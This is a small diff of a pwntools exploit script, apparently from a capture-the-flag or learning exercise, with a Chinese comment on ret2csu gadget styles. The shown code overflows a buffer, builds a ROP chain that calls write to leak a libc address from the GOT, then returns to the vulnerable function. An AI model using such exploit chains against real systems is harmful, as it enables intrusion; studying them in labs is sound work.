@@ -40,6 +40,7 @@ def leak_by_write():
     rop.raw(b'1\x00' + b'a' * (padding + pad - 2))
     write = elf.got['write']
     # 调用write函数，泄露libc的地址, rop.call 会自动 pop rdi, ret来传入参数
+    # 只有pop形式的 csu_init 才能直接这么写, mov型的需要手动补 pwn_stack_04_rop_ret2csu0_ret2libc_1_by_pwntools.py
     rop.ret2csu(edi=1, rsi=write, rdx=0x30, call=write)
     rop.call('vuln')  # 调用main函数，使程序重新运行
     s.sendlineafter('backdoor!', rop.chain())
